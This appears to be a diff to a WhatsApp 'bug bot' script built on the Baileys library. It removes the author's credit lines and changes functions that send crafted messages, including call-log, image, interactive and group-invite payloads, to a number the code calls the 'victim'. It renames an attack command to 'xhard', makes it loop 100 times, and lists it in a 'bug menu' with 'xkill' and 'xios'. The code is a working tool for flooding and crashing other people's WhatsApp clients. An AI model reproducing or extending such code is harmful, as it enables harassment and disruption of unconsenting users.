@@ -1,11 +1,3 @@
-//base by DGXeon (Xeon Bot Inc.)
-//re-upload? recode? copy code? give credit ya :)
-//YouTube: @DGXeon
-//Instagram: unicorn_xeon13
-//Telegram: t.me/xeonbotinc
-//GitHub: @DGXeon
-//WhatsApp: +916909137213
-//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
 
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
 const os = require('os')
@@ -179,28 +171,30 @@ const subscribe_dgxeon = {
   }
 };
 
-async function calllogpr(target) {
-    const callLogMessage = {
-        isVideo: true,
-        callOutcome: "1",
-        durationSecs: "0",
-        callType: "REGULAR",
-        participants: [{
-            jid: "62895364760801@s.whatsapp.net",
-            callOutcome: "1"
-        }]
-    };
+async function sendImageMessage(target) {
+    const imageUrl = 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m231/up-oil-image-830ec024-9dc4-44c5-86b3-89926b674a87?ccb=9-4&oh=01_Q5AaIP3GKCfyhIL4KsQC3awdKsM0g1Kz3zvy5LANUU4zQQpu&oe=675F2158&_nc_sid=e6ed6c&mms3=true';
+    const caption = 'ueuruueuejjrjriir';
+    const mimetype = 'image/jpeg';
+    const viewOnce = true;
 
     const message = await generateWAMessageFromContent(
         target,
         proto.Message.fromObject({
-            callLogMesssage: callLogMessage
+            imageMessage: {
+                url: imageUrl,
+                mimetype: mimetype,
+                caption: caption,
+                viewOnce: viewOnce,
+                jpegThumbnail: null,
+            }
         }),
         { userJid: target }
     );
 
     await XeonBotInc.relayMessage(target, message.message, { messageId: message.key.id });
 }
+
+
 
 
 async function grpinv(target) {
@@ -232,13 +226,12 @@ async function grpinv(target) {
 
 
 async function home(target) {
-	let msgnull = "⋆✩⋆ Hunter Spamer ⋆✩⋆".repeat(10000);
-	await XeonBotInc.relayMessage(target, {
+    await XeonBotInc.relayMessage(target, {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
                     body: {
-                        text: msgnull,
+                        text: "⋆✩⋆ Hunter Spamer ⋆✩⋆",
                         format: "EXTENSIONS_1"
                     },
                     nativeFlowResponseMessage: {
@@ -2468,16 +2461,16 @@ if (!isPremium) return replygcxeon(mess.prem)
  if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 212xxxxxxxx`)
   victim = text.split("|")[0]+'@s.whatsapp.net'
   //await replygcxeon(`In process....`)
-  calllogpr(victim)
+  sendImageMessage(victim)
   //replygcxeon(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」`)
 }
 break
-case 'xhome':{
+case 'xhard':{
 if (!isPremium) return replygcxeon(mess.prem)
  if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 212xxxxxxxx`)
   victim = text.split("|")[0]+'@s.whatsapp.net'
   await replygcxeon(`In process....`)
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 100; i++) {
   sendLiveLocationMessage(victim)
   home(victim)
   grpinv(victim)
@@ -2882,7 +2875,7 @@ break
             case 'help':
             case 'alive':
             case '?':
-                let xeonmenuoh = `Hello ${pushname}\n╰┈➤ ${xeonytimewisher} 😄\n${readmore}\n╰┈➤ʙᴜɢ ᴍᴇɴᴜ\nxkill <number>\nxios <number>\n╰┈➤ ʙᴜɢ ᴏᴛʜᴇʀ\nxpairspam <number>`
+                let xeonmenuoh = `Hello ${pushname}\n╰┈➤ ${xeonytimewisher} 😄\n${readmore}\n╰┈➤ʙᴜɢ ᴍᴇɴᴜ\nxkill <number>\nxhard <number>\nxios <number>\n╰┈➤ ʙᴜɢ ᴏᴛʜᴇʀ\nxpairspam <number>`
 
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
